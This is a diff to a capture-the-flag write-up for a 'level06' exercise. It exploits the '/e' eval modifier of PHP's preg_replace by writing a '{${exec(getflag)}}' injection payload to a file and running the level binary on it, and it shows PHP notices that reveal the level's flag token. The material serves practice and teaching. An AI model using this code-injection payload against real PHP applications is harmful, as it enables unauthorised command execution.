@@ -47,8 +47,15 @@ The  '/e' option in the preg_replace function, allows content  to be evalauted a
 Same as the previous exercice we are going to inject 'getflag' in script. Only the syntax will change but the principle stays the same.
 
 
+
 ```bash 
-$ echo 
-?>
+$ echo '[x {${exec(getflag)}}]' > /tmp/coucou 
+$ ./level06 /tmp/coucou
+
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+
+````
 
 
